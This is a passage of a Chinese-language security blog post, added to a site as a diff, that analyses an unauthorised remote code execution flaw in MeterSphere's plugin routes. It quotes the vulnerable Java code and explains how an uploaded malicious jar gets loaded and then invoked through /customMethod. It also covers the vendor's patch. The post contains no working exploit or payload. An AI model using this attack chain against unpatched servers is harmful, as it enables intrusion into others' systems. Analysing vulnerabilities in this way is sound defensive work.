class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="修复补丁-1"><a href="#修复补丁-1" class="headerlink" title="修复补丁"></a>修复补丁</h4><p>漏洞的issue中提的补丁，修改了允许匿名访问的路由限制，匿名用户无法再使用该功能。</p>
+<p><img src="/img/metersphere/image_V24pfckWqC.png"></p>
+<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>这个漏洞是安全厂商提交给官方的漏洞，看不到漏洞细节，但是可以在GitHub找到相对应的commit记录。公开的漏洞信息是该漏洞是一个未授权的远程代码执行漏洞，影响v1.16.3及以前的版本，在GitHub的release中可以看到v1.16.4只有一个fix，看起来像是专门为修复这个漏洞升级的版本。</p>
+<p><img src="/img/metersphere/image_k-nf6j6bIr.png"></p>
+<p>commit标题为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fix(测试计划): 修复自定义插件安全漏洞及用例模块匹配问题</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对应着两处代码修改。跟修复漏洞相关的无疑是这一处。</p>
+<p><img src="/img/metersphere/image_s-UDnerIyQ.png"></p>
+<p>补丁中删除了&#x2F;plugin&#x2F;路径的匿名访问。因此漏洞分析着重看这一部分路由的代码逻辑。直接在代码种全局搜索&#x2F;plugin，很快可以定位到io.metersphere.controller.PluginController，该类处理&#x2F;plugin路由。其中包含了5种方法，方法不多因此依次分析。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">PostMapping</span>(<span class="string">&quot;/add&quot;</span>)</span><br><span class="line">public <span class="title class_">String</span> <span class="title function_">create</span>(<span class="params">@RequestPart(value = <span class="string">&quot;file&quot;</span>, required = <span class="literal">false</span>) MultipartFile file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title class_">MSException</span>.<span class="title function_">throwException</span>(<span class="string">&quot;上传文件/执行入口为空&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pluginService.<span class="title function_">editPlugin</span>(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">GetMapping</span>(<span class="string">&quot;/list&quot;</span>)</span><br><span class="line">public <span class="title class_">List</span>&lt;<span class="title class_">PluginDTO</span>&gt; <span class="title function_">list</span>(<span class="params"><span class="built_in">String</span> name</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> pluginService.<span class="title function_">list</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">GetMapping</span>(<span class="string">&quot;/get/&#123;id&#125;&quot;</span>)</span><br><span class="line">public <span class="title class_">Plugin</span> <span class="title function_">get</span>(<span class="params">@PathVariable <span class="built_in">String</span> id</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> pluginService.<span class="title function_">get</span>(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">GetMapping</span>(<span class="string">&quot;/delete/&#123;id&#125;&quot;</span>)</span><br><span class="line">public <span class="title class_">String</span> <span class="title function_">delete</span>(<span class="params">@PathVariable <span class="built_in">String</span> id</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> pluginService.<span class="title function_">delete</span>(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">PostMapping</span>(value = <span class="string">&quot;/customMethod&quot;</span>)</span><br><span class="line">public <span class="title class_">Object</span> <span class="title function_">customMethod</span>(<span class="params">@RequestBody PluginRequest request</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> pluginService.<span class="title function_">customMethod</span>(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个add方法， 可以看到上传了一个文件，并调用pluginService的editPlugin方法，跟进这个方法。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public <span class="title class_">String</span> <span class="title function_">editPlugin</span>(<span class="params">MultipartFile file</span>) &#123;</span><br><span class="line">    <span class="title class_">String</span> id = <span class="variable constant_">UUID</span>.<span class="title function_">randomUUID</span>().<span class="title function_">toString</span>();</span><br><span class="line">    <span class="title class_">String</span> path = <span class="title class_">FileUtils</span>.<span class="title function_">create</span>(id, file);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">StringUtils</span>.<span class="title function_">isNotEmpty</span>(path)) &#123;</span><br><span class="line">        <span class="title class_">List</span>&lt;<span class="title class_">PluginResourceDTO</span>&gt; resources = <span class="variable language_">this</span>.<span class="title function_">getMethod</span>(path, file.<span class="title function_">getOriginalFilename</span>());</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">CollectionUtils</span>.<span class="title function_">isNotEmpty</span>(resources)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="title class_">PluginResourceDTO</span> resource : resources) &#123;</span><br><span class="line">                <span class="title class_">PluginExample</span> example = <span class="keyword">new</span> <span class="title class_">PluginExample</span>();</span><br><span class="line">                example.<span class="title function_">createCriteria</span>().<span class="title function_">andPluginIdEqualTo</span>(resource.<span class="title function_">getPluginId</span>());</span><br><span class="line">                <span class="title class_">List</span>&lt;<span class="title class_">Plugin</span>&gt; plugins = pluginMapper.<span class="title function_">selectByExample</span>(example);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title class_">CollectionUtils</span>.<span class="title function_">isNotEmpty</span>(plugins)) &#123;</span><br><span class="line">                    <span class="title class_">String</span> delPath = plugins.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">getSourcePath</span>();</span><br><span class="line">                    <span class="comment">// this.closeJar(delPath);</span></span><br><span class="line">                    <span class="title class_">FileUtils</span>.<span class="title function_">deleteFile</span>(delPath);</span><br><span class="line">                    pluginMapper.<span class="title function_">deleteByExample</span>(example);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">create</span>(resource, path, file.<span class="title function_">getOriginalFilename</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先会随机生成一个文件名，并调用FileUtils.create方法创建这个文件。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private <span class="title class_">List</span>&lt;<span class="title class_">PluginResourceDTO</span>&gt; <span class="title function_">getMethod</span>(<span class="params"><span class="built_in">String</span> path, <span class="built_in">String</span> fileName</span>) &#123;</span><br><span class="line">    <span class="title class_">List</span>&lt;<span class="title class_">PluginResourceDTO</span>&gt; resources = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">loadJar</span>(path);</span><br><span class="line">    <span class="title class_">List</span>&lt;<span class="title class_">Class</span>&lt;?&gt;&gt; classes = <span class="title class_">CommonUtil</span>.<span class="title function_">getSubClass</span>(fileName);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="title class_">Class</span>&lt;?&gt; aClass : classes) &#123;</span><br><span class="line">            <span class="title class_">Object</span> instance = aClass.<span class="title function_">newInstance</span>();</span><br><span class="line">            <span class="title class_">Object</span> pluginObj = aClass.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;init&quot;</span>).<span class="title function_">invoke</span>(instance);</span><br><span class="line">            <span class="keyword">if</span> (pluginObj != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="title class_">PluginResourceDTO</span> pluginResourceDTO = <span class="keyword">new</span> <span class="title class_">PluginResourceDTO</span>();</span><br><span class="line">                <span class="title class_">BeanUtils</span>.<span class="title function_">copyBean</span>(pluginResourceDTO, (<span class="title class_">PluginResource</span>) pluginObj);</span><br><span class="line">                pluginResourceDTO.<span class="title function_">setEntry</span>(aClass.<span class="title function_">getName</span>());</span><br><span class="line">                resources.<span class="title function_">add</span>(pluginResourceDTO);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">        <span class="title class_">LogUtil</span>.<span class="title function_">error</span>(<span class="string">&quot;初始化脚本异常：&quot;</span> + e.<span class="title function_">getMessage</span>());</span><br><span class="line">        <span class="title class_">MSException</span>.<span class="title function_">throwException</span>(<span class="string">&quot;调用插件初始化脚本失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resources;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会调用LoadJar方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">void</span> <span class="title function_">loadJar</span>(<span class="params"><span class="built_in">String</span> jarPath</span>) &#123;</span><br><span class="line">    <span class="title class_">File</span> jarFile = <span class="keyword">new</span> <span class="title class_">File</span>(jarPath);</span><br><span class="line">    <span class="comment">// 从URLClassLoader类中获取类所在文件夹的方法，jar也可以认为是一个文件夹</span></span><br><span class="line">    <span class="title class_">Method</span> method = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        method = <span class="title class_">URLClassLoader</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;addURL&quot;</span>, <span class="variable constant_">URL</span>.<span class="property">class</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">NoSuchMethodException</span> | <span class="title class_">SecurityException</span> e1) &#123;</span><br><span class="line">        e1.<span class="title function_">printStackTrace</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取方法的访问权限以便写回</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        method.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取系统类加载器</span></span><br><span class="line">        <span class="title class_">URLClassLoader</span> classLoader = (<span class="title class_">URLClassLoader</span>) <span class="title class_">ClassLoader</span>.<span class="title function_">getSystemClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable constant_">URL</span> url = jarFile.<span class="title function_">toURI</span>().<span class="title function_">toURL</span>();</span><br><span class="line">        <span class="comment">//URLClassLoader classLoader = new URLClassLoader(new URL[]&#123;url&#125;);</span></span><br><span class="line"></span><br><span class="line">        method.<span class="title function_">invoke</span>(classLoader, url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">        <span class="title class_">LogUtil</span>.<span class="title function_">error</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法执行URLClassloader.addURL(jarPath)方法，相当于把我们传入的文件路径加入了classpath列表。完成后回到上个方法，继续往下走，会调用CommonUtil.getSubClass(fileName);</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="title class_">List</span>&lt;<span class="title class_">Class</span>&lt;?&gt;&gt; <span class="title function_">getSubClass</span>(<span class="params"><span class="built_in">String</span> fileName</span>) &#123;</span><br><span class="line">    <span class="title class_">List</span>&lt;<span class="title class_">Class</span>&lt;?&gt;&gt; classes = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">StringUtil</span>.<span class="title function_">isNotEmpty</span>(fileName) &amp;&amp; fileName.<span class="title function_">endsWith</span>(<span class="string">&quot;.jar&quot;</span>)) &#123;</span><br><span class="line">            fileName = fileName.<span class="title function_">substring</span>(<span class="number">0</span>, fileName.<span class="title function_">length</span>() - <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">LogUtil</span>.<span class="title function_">info</span>(<span class="string">&quot;获取到文件路径：&quot;</span> + fileName);</span><br><span class="line">        <span class="title class_">Resource</span> resource = <span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(fileName);</span><br><span class="line">        <span class="title class_">Properties</span> inPro = <span class="title class_">PropertiesLoaderUtils</span>.<span class="title function_">loadProperties</span>(resource);</span><br><span class="line">        <span class="keyword">if</span> (inPro != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="title class_">LogUtil</span>.<span class="title function_">info</span>(<span class="string">&quot;开始读取文件内容进行反射处理&quot;</span>);</span><br><span class="line">            <span class="title class_">Set</span>&lt;<span class="title class_">String</span>&gt; entryObj = inPro.<span class="title function_">stringPropertyNames</span>();</span><br><span class="line">            <span class="keyword">if</span> (entryObj != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="title class_">String</span> entry : entryObj) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="title class_">Class</span>&lt;?&gt; clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(entry);</span><br><span class="line">                    classes.<span class="title function_">add</span>(clazz);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">        <span class="title class_">MSException</span>.<span class="title function_">throwException</span>(<span class="string">&quot;解析插件失败，未找到入口配置&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里会将我们传入的jar包中PropertiesLoaderUtils.loadProperties能找到的属性类都调用Class.forName加入到内存中。</p>
+<p>到这里，漏洞的第一步也就很清晰了，我们可以上传一个恶意的jar包，其中包含了我们传入的恶意class文件，并且在jar包中的属性配置中，设置为我们传入的类的名字。从而服务端就会加载我们传入的恶意类到内存。接下俩需要找一个会实例化我们传入类的地方。也就是漏洞执行的第二步。</p>
+<p>哪里会实例化呢？我们回到io.metersphere.controller.PluginController类中，对其中的方法进行分析，很快可以发现最后一个路径，&#x2F;customMethod，存在对应的调用。</p>
+<p>该方法调用的是pluginService.customMethod方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="title class_">Object</span> <span class="title function_">customMethod</span>(<span class="params">PluginRequest request</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(request.<span class="title function_">getEntry</span>());</span><br><span class="line">        <span class="title class_">Object</span> instance = clazz.<span class="title function_">newInstance</span>();</span><br><span class="line">        <span class="title class_">Object</span> pluginObj = clazz.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;customMethod&quot;</span>, <span class="title class_">String</span>.<span class="property">class</span>).<span class="title function_">invoke</span>(instance, request.<span class="title function_">getRequest</span>());</span><br><span class="line">        <span class="keyword">return</span> pluginObj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> ex) &#123;</span><br><span class="line">        <span class="title class_">LogUtil</span>.<span class="title function_">error</span>(<span class="string">&quot;加载自定义方法失败：&quot;</span> + ex.<span class="title function_">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法，会实例化我们传入的任意类，并调用该类的customMethod方法，因此整条链就连起来了。</p>
+<h4 id="修复补丁-2"><a href="#修复补丁-2" class="headerlink" title="修复补丁"></a>修复补丁</h4><p>官方使用的修复方法是将存在漏洞的路径增加权限控制。但是存在权限的用户还是可以利用该功能远程命令执行。这里我不太明白，官方这里的修复行为应该意为许可后台用户是有控制主机的权限，但是同时又在之前的版本中修复了多个后台漏洞，并给了CVE编号。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.xml"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
